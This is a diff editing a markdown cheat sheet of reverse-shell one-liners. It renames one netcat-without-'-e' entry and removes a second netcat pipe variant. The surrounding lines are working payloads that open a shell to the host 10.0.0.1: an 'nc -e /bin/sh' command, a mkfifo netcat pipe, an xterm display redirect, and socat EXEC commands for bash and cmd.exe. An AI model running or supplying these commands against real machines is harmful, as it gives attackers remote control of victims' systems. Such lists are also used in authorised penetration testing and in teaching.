@@ -115,16 +115,10 @@ xterm -display 10.0.0.1:1
 nc -e /bin/sh 10.0.0.1 666
 ```
 
-**Netcat without -e #1**
+**Netcat without -e**
 
 ```
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 666 > /tmp/f
-```
-
-**Netcat without -e #2**
-
-```
-nc localhost 443 | /bin/sh | nc localhost 444
 ```
  
 **Socat**
@@ -133,7 +127,6 @@ nc localhost 443 | /bin/sh | nc localhost 444
 user@ubuntu:~$ socat - TCP4:10.0.0.1:4444 EXEC:'/bin/bash -li'
 C:\> socat TCP4:10.0.0.1:666 EXEC:'cmd.exe'
 ```
-
 
 **Powercat**
 
